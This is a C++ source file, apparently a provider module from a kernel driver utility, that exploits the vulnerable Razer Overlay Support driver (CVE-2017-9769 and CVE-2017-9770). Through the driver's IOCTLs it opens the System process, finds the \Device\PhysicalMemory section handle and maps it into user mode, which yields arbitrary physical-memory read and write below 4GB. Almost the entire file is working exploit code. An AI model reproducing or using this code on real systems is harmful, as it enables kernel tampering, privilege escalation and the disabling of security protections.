/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       RZPNK.CPP
*
*  VERSION:     1.00
*
*  DATE:        02 Feb 2020
*
*  Razer Overlay Support driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/rzpnk.h"

/*{

//
// Unfortunately all what it can - read/write to first 4gb of phys RAM.
// Exploitation of this driver in CVE-2017-14398 was a PURELY accidential.
//
    KDU_MAX_NTBUILDNUMBER,
    IDR_RAZER,
    0,
    (LPWSTR)L"CVE-2017-9769, CVE-2017-9770",
    (LPWSTR)L"Razer",
    (LPWSTR)L"47CD78C9-64C3-47C2-B80F-677B887CF095",
    (provReadKernelVM)KDUProviderStub,
    (provWriteKernelVM)KDUProviderStub,
    (provVirtualToPhysical)KDUProviderStub,
    (provReadControlRegister)KDUProviderStub,
    (provReadPhysicalMemory)RazerReadPhysicalMemory,
    (provWritePhysicalMemory)RazerWritePhysicalMemory,
    (provRegisterDriver)RazerRegisterDriver,
    (provUnregisterDriver)RazerUnregisterDriver
}*/

//
// Based on CVE-2017-9769, CVE-2017-9770.
//

HANDLE g_PhysicalMemorySection = NULL;

/*
* RazerCallDriver
*
* Purpose:
*
* Call Razer Rzpnk driver.
*
*/
BOOL RazerCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* RazerOpenProcess
*
* Purpose:
*
* Call ZwOpenProcess via razer driver request.
*
*/
BOOL RazerOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult;
    RAZER_OPEN_PROCESS request;

    request.ProcessId = ProcessId;
    request.ProcessHandle = NULL;

    bResult = RazerCallDriver(DeviceHandle,
        IOCTL_RZPNK_OPEN_PROCESS,
        &request,
        sizeof(request),
        &request,
        sizeof(request));

    if (bResult) {
        *ProcessHandle = request.ProcessHandle;
    }

    return bResult;
}

/*
* RazerMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID RazerMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG ViewSize)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    RAZER_MAP_SECTION_INFO request;
    HANDLE selfHandle;

    UNREFERENCED_PARAMETER(PhysicalAddress);

    CLIENT_ID clientID;

    clientID.UniqueProcess = UlongToHandle(GetCurrentProcessId());
    clientID.UniqueThread = NULL;

    OBJECT_ATTRIBUTES dummy;
    InitializeObjectAttributes(&dummy, NULL, 0, NULL, NULL);

    if (!NT_SUCCESS(NtOpenProcess(&selfHandle, PROCESS_ALL_ACCESS, &dummy, &clientID)))
        return NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewCommitSize = ViewSize;
    request.ProcessHandle = selfHandle;
    request.ProcessId = clientID.UniqueProcess;
    request.SectionHandle = g_PhysicalMemorySection;

    bResult = RazerCallDriver(DeviceHandle,
        IOCTL_RZPNK_MAP_SECTION_USER_MODE,
        &request,
        sizeof(request),
        &request,
        sizeof(request));

    if (!bResult) {
        dwError = GetLastError();
    }
    else {
        dwError = RtlNtStatusToDosError(request.Status);
    }

    CloseHandle(selfHandle);

    SetLastError(dwError);
    return request.MappedBaseAddress;
}

/*
* RazerReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write virtual memory via Razer.
*
*/
BOOL WINAPI RazerReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;

    ULONG ViewSize;

    if ((Address + NumberOfBytes) > MAXDWORD32)
        return FALSE;

    ViewSize = Address + NumberOfBytes;

    PVOID mappedSection = RazerMapMemory(DeviceHandle, Address, ViewSize);
    if (mappedSection) {

        if (DoWrite) {
            RtlCopyMemory(RtlOffsetToPointer(mappedSection, Address), Buffer, NumberOfBytes);
        }
        else {
            RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, Address), NumberOfBytes);
        }

        NtUnmapViewOfSection(NtCurrentProcess(), mappedSection);

        bResult = TRUE;
    }

    SetLastError(dwError);
    return bResult;
}

/*
* RazerReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI RazerReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return RazerReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* RazerWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI RazerWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return RazerReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* RazerRegisterDriver
*
* Purpose:
*
* Initialize Razer specific global variable (section handle value).
* Must be called before accessing Kernel R/W primitives.
*
*/
BOOL WINAPI RazerRegisterDriver(
    _In_ HANDLE DeviceHandle)
{
    BOOL bResult = FALSE;
    ULONG SectionObjectType = (ULONG)-1;
    HANDLE processHandle = NULL;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;

    do {
        //
        // Open System process.
        //
        if (!RazerOpenProcess(DeviceHandle, (HANDLE)SYSTEM_PID_MAGIC, &processHandle))
            break;

        //
        // Open dummy section handle.
        //
        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (!NT_SUCCESS(NtOpenSection(&sectionHandle, SECTION_QUERY, &obja)))
            break;

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL)
            break;

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        //
        // Find dummy section handle and remember it object type index.
        //
        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                SectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (SectionObjectType == (ULONG)-1)
            break;

        HANDLE testHandle = NULL;

        //
        // Some heur to find \Device\PhysicalMemory section.
        //
        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)SectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                testHandle = (HANDLE)(SYSTEM_USER_TO_KERNEL_HANDLE + handleArray->Handles[i].HandleValue);
                g_PhysicalMemorySection = testHandle;

                PVOID testBuffer = RazerMapMemory(DeviceHandle, 0, 0x100000); //1mb
                if (testBuffer) {

                    ULONG_PTR PML4 = supGetPML4FromLowStub1M((ULONG_PTR)testBuffer);

                    NtUnmapViewOfSection(NtCurrentProcess(), testBuffer);

                    //
                    // PML4 found, section looks legit.
                    //
                    if (PML4)
                        break;
                }
                g_PhysicalMemorySection = NULL;
            }
        }

        //
        // Remember section handle if found and valid.
        //
        if (testHandle) {
            g_PhysicalMemorySection = testHandle;
            bResult = TRUE;
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (processHandle) NtClose(processHandle);
    if (handleArray) supHeapFree(handleArray);

    return bResult;
}

/*
* RazerUnregisterDriver
*
* Purpose:
*
* Free razer driver related resources.
*
*/
BOOL WINAPI RazerUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return TRUE;
}
